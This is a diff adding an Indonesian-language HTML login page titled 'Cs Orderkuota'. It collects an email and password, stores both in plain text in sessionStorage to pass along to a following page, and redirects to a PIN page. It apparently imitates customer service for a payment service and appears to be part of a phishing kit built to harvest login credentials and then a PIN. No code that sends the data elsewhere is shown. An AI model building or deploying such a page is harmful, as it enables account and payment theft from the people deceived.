@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cs-Orderkuota</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(180deg, #14532d, #22c55e);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #fff;
+    }
+    .container {
+      background: #14532d;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
+      width: 320px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+      font-size: 15px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #22c55e;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 10px;
+    }
+    .btn:hover {
+      background: #16a34a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Cs Orderkuota</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Masukkan Email" required />
+      <input type="password" id="password" placeholder="Kata Sandi" required minlength="6" />
+      <button class="btn" type="submit">Lanjut</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      // Simpan data login di sessionStorage untuk dikirim ke halaman berikutnya
+      sessionStorage.setItem("email", document.getElementById("email").value);
+      sessionStorage.setItem("password", document.getElementById("password").value);
+      // Arahkan ke halaman PIN
+      window.location.href = "pin.html";
+    });
+  </script>
+</body>
+</html>
